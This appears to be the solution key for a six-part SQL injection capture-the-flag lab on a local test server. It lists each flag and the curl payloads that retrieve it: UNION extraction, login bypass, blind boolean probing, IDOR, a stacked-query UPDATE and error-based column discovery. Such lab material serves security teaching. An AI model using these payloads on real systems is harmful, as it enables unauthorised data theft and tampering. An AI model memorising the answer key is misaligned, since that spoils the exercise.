CHALLENGE 1: UNION-Based SQL Injection (Search)
Flag: FLAG{un10n_s3l3ct_m4st3r}

  The /search endpoint concatenates user input into a LIKE query:
    SELECT * FROM posts WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'

  Inject a UNION SELECT to extract from the flags table:

  curl "http://localhost:5001/search?q=' UNION SELECT 1,flag_name,flag_value,4,5,6 FROM flags--"

  All flags from the flags table are returned as "posts".

-------------------------------------------------------------------------------

CHALLENGE 2: Authentication Bypass (Login)
Flag: FLAG{4uth_byp4ss_sqli}

  The /login endpoint uses:
    SELECT * FROM users WHERE username='{username}' AND password='{password}'

  Bypass with a comment to truncate the password check:

  curl -X POST http://localhost:5001/login \
    -d "username=admin'--&password=anything"

  Alternative: username = ' OR 1=1--, password = anything
  The admin dashboard appears with the flag.

-------------------------------------------------------------------------------

CHALLENGE 3: Blind Boolean-Based SQL Injection (Post)
Flag: FLAG{bl1nd_sql1_pr0}

  The /post/<id> endpoint is vulnerable to integer-based injection:
    SELECT * FROM posts WHERE id = {post_id}

  Test:
    curl http://localhost:5001/post/1%20AND%201=1    (returns post)
    curl http://localhost:5001/post/1%20AND%201=2    (returns nothing)

  Extract the flag from the flags table character by character:
    /post/1 AND (SELECT unicode(substr(flag_value,1,1)) FROM flags LIMIT 1)>64

  Or use UNION directly:
    curl "http://localhost:5001/post/1 UNION SELECT 1,flag_value,3,4,5,6 FROM flags WHERE flag_name='blind_flag'"

CHALLENGE 4: Profile IDOR + SQL Injection
Flag: FLAG{sqli_profile_idor_4dm1n}

  The /profile endpoint takes an id parameter with no authorization check:
    SELECT * FROM users WHERE id = {id}

  Simply access admin's profile:
  curl "http://localhost:5001/profile?id=1"

  The admin's secret_note field contains the flag.

  UNION injection also works:
  curl "http://localhost:5001/profile?id=1 UNION SELECT 1,2,3,4,flag_value FROM flags--"

CHALLENGE 5: Stacked Queries (Admin Logs)
Flag: FLAG{st4ck3d_qu3ry_h4ck}

  The /admin/logs endpoint has a sort parameter:
    SELECT * FROM admin_logs ORDER BY {sort}

  The hidden logs have is_admin_visible=0. Use stacked queries to
  make them visible:

  curl "http://localhost:5001/admin/logs?sort=id;UPDATE admin_logs SET is_admin_visible=1 WHERE 1=1--"

  Then visit the admin logs page again:
  curl http://localhost:5001/admin/logs

  The previously hidden log entry contains the flag.

CHALLENGE 6: Error-Based SQL Injection (API)
Flag: FLAG{3rr0r_b4s3d_l34k}

  The /api/posts endpoint returns detailed error messages as JSON,
  including the full query text:
    SELECT * FROM posts WHERE category = '{category}'

  Step 1: Use error messages to discover the column count:
  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3--"
  Error: "SELECTs to the left and right of UNION do not have the same
  number of result columns" (tells you 3 is wrong)

  Step 2: Find correct column count (6 columns):
  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,2,3,4,5,6--"
  (succeeds — no error)

  Step 3: Extract the flag via UNION:
  curl "http://localhost:5001/api/posts?category='+UNION+SELECT+1,'api_flag',flag_value,4,5,6+FROM+flags+WHERE+flag_name%3D'api_flag'--"

  The key difference from Challenge 1 is that this endpoint returns
  JSON with structured error messages — useful for column discovery
  and debugging injection payloads. In MySQL/MSSQL, CAST/CONVERT-based
  errors can leak data directly; SQLite is more limited.

  NOTE: SQLite doesn't produce CAST errors that embed data (it silently
  converts), so the primary technique here is using the error feedback
  to refine a UNION-based extraction.
